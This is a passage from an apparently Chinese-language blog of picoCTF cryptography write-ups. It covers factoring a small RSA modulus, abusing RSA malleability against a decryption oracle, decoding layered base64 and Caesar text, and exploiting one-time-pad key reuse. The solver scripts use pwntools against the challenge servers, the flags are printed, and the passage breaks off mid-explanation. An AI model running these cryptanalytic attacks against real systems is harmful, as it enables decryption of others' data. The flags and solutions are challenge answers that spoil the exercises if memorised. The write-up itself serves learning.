<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Private key</mtext><mo>=</mo><mo stretchy="false">(</mo><mi>d</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{Private key} = (d, n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord">Private key</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
</ul>
<p>複習完後，看一下題目的說明。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">In RSA, a small e value can be problematic, but what about N? Can you decrypt this?</span><br><span class="line">==============================</span><br><span class="line">Decrypt my super sick RSA:</span><br><span class="line">c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684</span><br><span class="line">n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637</span><br><span class="line">e: 65537</span><br></pre></td></tr></table></figure>
<p>這題的敘述中告訴我們，當 e 太小的時候我們可以使用小公鑰指數攻擊(Low public exponent attack)，而題目要我們思考當 N 太小的時候我們可以如何利用。</p>
<p>回去看一下 RSA 加密的流程後，我們發現 N 是兩個質數的乘積，而當 N 太小的時候我們就可以暴力破解出兩個 P 跟 Q。這裡我們直接使用 FactorDB 去找 N 的因數，就可以找到 P 和 Q 了。</p>
<p>而有了 P 和 Q，我們就可以順著 RSA 流程找到明文 M 了，我寫了個 Python 幫我找出明文，如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long2str</span>(<span class="params">long_int: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(long_int).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">421345306292040663864066688931456845278496274597031632020995583473619804626233684</span></span><br><span class="line">n = <span class="number">631371953793368771804570727896887140714495090919073481680274581226742748040342637</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># From Factor db find p and q</span></span><br><span class="line">f = FactorDB(n)</span><br><span class="line">f.connect()</span><br><span class="line">factors = f.get_factor_list()</span><br><span class="line">p = factors[<span class="number">0</span>]</span><br><span class="line">q = factors[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Private key: d = <span class="subst">&#123;d&#125;</span>&quot;</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decrypted message: m = <span class="subst">&#123;long2str(m)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>最後找到的明文會是一個很大的數字，這時候再用 Crypto.Util.number 的 long_to_bytes 並 decode，將其轉為字符串，就可以得到 flag 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;sma11_N_n0_g0od_55304594&#125;</span><br></pre></td></tr></table></figure>
<h2 id="No-padding-no-problem">No padding, no problem</h2>
<blockquote>
<p>可以先看過這篇 <a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10205727">Day 14:[離散數學]同餘（Mod）是什麼？</a></p>
</blockquote>
<p>當我們把題目給的密文拿去解密，他會說<code>Will not decrypt the ciphertext. Try Again</code>。代表題目的這支程式應該是在偵測我們輸入的是否為 Ciphertext。而我們知道</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mi>l</mi><mi>a</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">Plaintext = c^d \mod n
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">Pl</span><span class="mord mathnormal">ain</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><mi>c</mi><mo>+</mo><mi>n</mi><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c^d \mod n = (c+n)^d \mod n
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8991em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1491em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p>
<p>所以我們利用題目給的 c 和 n 相加後，輸入到他的程式會得到:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here you go: 290275030195850039473456618367455885069965748851278076756743720446703314517401359267322769037469251445384426639837648598397</span><br></pre></td></tr></table></figure>
<p>接著只要再利用 Crypto 的 long_to_bytes3 方法就可以找到明文，如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;mercury.picoctf.net&quot;</span>, <span class="number">10333</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;n:&quot;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">r.recvuntil(<span class="string">&quot;ciphertext:&quot;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">num = n + c</span><br><span class="line">r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Here you go:&quot;</span>)</span><br><span class="line">m = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;m4yb3_Th0se_m3s54g3s_4r3_difurrent_1772735&#125;</span><br></pre></td></tr></table></figure>
<h2 id="interencdec">interencdec</h2>
<p>題目給了密文 enc_flag，如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YidkM0JxZGtwQlRYdHFhR3g2YUhsZmF6TnFlVGwzWVROclh6YzRNalV3YUcxcWZRPT0nCg==</span><br></pre></td></tr></table></figure>
<p>因為他最後面的兩個<code>==</code>讓他看起來很像是 base64 的格式，所以就用 base64 先 Decode 一下。這邊用的是<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/">CyberChef</a>這款工具，他可以線上進行很多種的編碼解碼、加密等等。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163439113.png" alt="b64 decode"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrXzc4MjUwaG1qfQ==</span><br></pre></td></tr></table></figure>
<p>解碼一次後長這樣，還是很像 base64 的格式，所以我又做了一次 base64 解碼。（注意：這邊要把前面的 b 拿掉，只留引號中的內容）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704163700571.png" alt="b64 decode"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpjvJAM&#123;jhlzhy_k3jy9wa3k_78250hmj&#125;</span><br></pre></td></tr></table></figure>
<p>再解碼一次後變成了這樣的形狀，看起來已經有 Flag 的雛型了（因為大括號），所以猜測它是某種置換密碼。就用最普遍的凱薩密碼來暴力解解看吧！Exploit 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = <span class="built_in">input</span>(<span class="string">&quot;Enter the encrypted flag: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">27</span>):</span><br><span class="line">    dec_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> enc_flag:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            <span class="keyword">if</span> char.isupper():</span><br><span class="line">                dec_flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) - i) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dec_flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) - i) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dec_flag += char</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;pico&quot;</span> <span class="keyword">in</span> dec_flag.lower():</span><br><span class="line">        <span class="built_in">print</span>(dec_flag)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;caesar_d3cr9pt3d_78250afc&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Easy-peasy">Easy peasy</h2>
<blockquote>
<p>想了解 OTP 可以去看看這個 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-tw/%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A2%BC%E6%9C%AC">一次性密碼本</a></p>
</blockquote>
<p>先看題目。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">******************Welcome to our OTP implementation!******************</span><br><span class="line">This is the encrypted flag!</span><br><span class="line">551e6c4c5e55644b56566d1b5100153d4004026a4b52066b4a5556383d4b0007</span><br><span class="line"></span><br><span class="line">What data would you like to encrypt?</span><br></pre></td></tr></table></figure>
<p>在這題中，我們要先閱讀他給我們的 Code。在 encrypt 函式中我們可以看到一些事情。因為題目給的 Cipher 的長度為 64，又因為他是以十六進制的方式輸出 Cipher，所以我們可以知道他用掉的<code>key_location</code>長度為 32，也就是說，我們下次在加密的時候是用第 33 位開始的 key。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def encrypt(key_location):</span><br><span class="line">    ui = input(&quot;What data would you like to encrypt? &quot;).rstrip()</span><br><span class="line">    if len(ui) == 0 or len(ui) &gt; KEY_LEN:</span><br><span class="line">        return -1</span><br><span class="line"></span><br><span class="line">    start = key_location  # 這裡從32開始</span><br><span class="line">    stop = key_location + len(ui)</span><br><span class="line"></span><br><span class="line">    kf = open(KEY_FILE, &quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">    if stop &gt;= KEY_LEN:</span><br><span class="line">        stop = stop % KEY_LEN</span><br><span class="line">        key = kf[start:] + kf[:stop]</span><br><span class="line">    else:</span><br><span class="line">        key = kf[start:stop]</span><br><span class="line">    key_location = stop</span><br><span class="line"></span><br><span class="line">    result = list(map(lambda p, k: &quot;&#123;:02x&#125;&quot;.format(ord(p) ^ k), ui, key))</span><br><span class="line"></span><br><span class="line">    print(&quot;Here ya go!\n&#123;&#125;\n&quot;.format(&quot;&quot;.join(result)))</span><br><span class="line"></span><br><span class="line">    return key_location</span><br></pre></td></tr></table></figure>
<p>知道了我們第一次輸入要加密的銘文是從第 32 個 key 開始後，我們要想辦法可以使用到跟題目一樣的那組 key，而在程式碼的這個區段我們可以發現一些事。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> stop &gt;= KEY_LEN:</span><br><span class="line">        stop = stop % KEY_LEN</span><br><span class="line">        key = kf[start:] + kf[:stop]</span><br></pre></td></tr></table></figure>
<p>在這邊，如果我們讓<code>stop</code>和<code>KEY_LEN</code>相等，讓<code>stop % KEY_LEN == 0</code>的話，<code>stop</code>就會被設定為 0，所以我們就可以讓 one-time pad 被重複使用了！所以我們先輸入一堆沒用的字元去填充那個區間段，讓他把第一個 50000 循環結束，再進入一次循環後我們就可以得到跟題目一樣的 key 了。</p>
<p>然後因為他加密的方法是用計算 XOR 的方式，所以我們可以簡單地透過再計算一次 XOR 得到明文，如下:</p>
<blockquote>
<p>key \oplus pt = ct$$ $$key \oplus ct = pt$$ $$pt \oplus ct = key
</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii  <span class="comment"># binascii.unhexlify() is used to convert hex to binary</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">50000</span> - <span class="number">32</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;mercury.picoctf.net&quot;</span>, <span class="number">11188</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(r.recvline())</span><br><span class="line">encrypted_flag = r.recvline().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypted_flag)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;A&quot;</span> * offset)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;?&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">32</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">encoded = r.recvline().strip()</span><br><span class="line">encoded = binascii.unhexlify(encoded)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;A&quot;</span> * <span class="number">32</span></span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encoded)):</span><br><span class="line">    key.append(<span class="built_in">ord</span>(message[i]) ^ encoded[i])</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line">encrypted_flag = binascii.unhexlify(encrypted_flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_flag)):</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(key[i] ^ encrypted_flag[i]))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h2 id="Custom-encryption">Custom encryption</h2>
<p>這題給了兩個檔案。一個是加密後的 flag，裡面還包含了加密需要的一些變量；另一個是加密腳本。既然給了腳本，那就先來看看 Code 吧。我結合了題目給的加密後的 flag 的資訊，把註解直接寫在了代碼裡面，看看吧！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generator</span>(<span class="params">g, x, p</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(g, x) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文 = 明文的每個字元ASCII碼 * 密鑰 * 311並append到一個list</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">        cipher.append(((<span class="built_in">ord</span>(char) * key * <span class="number">311</span>)))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">p</span>):</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, p + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> p % i == <span class="number">0</span>:</span><br><span class="line">            v = v + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dynamic_xor_encrypt</span>(<span class="params">plaintext, text_key</span>):</span><br><span class="line">    cipher_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(text_key)</span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(plaintext[::-<span class="number">1</span>]):  <span class="comment"># 從明文的末尾開始</span></span><br><span class="line">        key_char = text_key[i % key_length]  <span class="comment"># 循環text_key裡面每個字元</span></span><br><span class="line">        encrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) ^ <span class="built_in">ord</span>(key_char))  <span class="comment"># 對應的密文 = 明文 ^ 密鑰</span></span><br><span class="line">        cipher_text += encrypted_char</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">plain_text, text_key</span>):</span><br><span class="line">    p = <span class="number">97</span></span><br><span class="line">    g = <span class="number">31</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_prime(p) <span class="keyword">and</span> <span class="keyword">not</span> is_prime(g):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Enter prime numbers&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    a = randint(p - <span class="number">10</span>, p)</span><br><span class="line">    b = randint(g - <span class="number">10</span>, g)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;a = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;b = <span class="subst">&#123;b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a = 89</span></span><br><span class="line">    <span class="comment"># b = 27</span></span><br><span class="line">    <span class="comment"># p = 97</span></span><br><span class="line">    <span class="comment"># g = 31</span></span><br><span class="line">    u = generator(g, a, p)  <span class="comment"># u = 31 ** 89 % 97 = 49</span></span><br><span class="line">    v = generator(g, b, p)  <span class="comment"># u = 31** 27 % 97 = 85</span></span><br><span class="line">    key = generator(v, a, p)  <span class="comment"># key = 85 ** 89 % 97 = 12</span></span><br><span class="line">    b_key = generator(u, b, p)  <span class="comment"># b_key = 49 ** 27 % 97 = 12</span></span><br><span class="line">    shared_key = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> key == b_key:</span><br><span class="line">        shared_key = key  <span class="comment"># shared_key = 12</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid key&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    semi_cipher = dynamic_xor_encrypt(plain_text, text_key)</span><br><span class="line">    cipher = encrypt(semi_cipher, shared_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;cipher is: <span class="subst">&#123;cipher&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    test(message, <span class="string">&quot;trudeau&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>由上面的代碼可以知道，它是經過了兩次的加密，一次是把明文反過來並讓其對<code>text_key</code>循環做 XOR，第二次是把第一次加密得到的東西轉 ASCII 並乘以 key 再乘以 311。</p>
<p>解密的話就反過來，先去除以 311 再除以 key（這裡為 12），得到一個半密文（semi_cipher）。接下來這個半密文要先反轉，再用它寫好的 function 去做 XOR（因為它的 function 裡面又有一次反轉，所以這樣剛好會是和加密時相同的順序），最後得到的這個明文還要再反轉一次，才會得到正確的 flag。至於為甚麼要反轉兩次，解釋如下：</p>
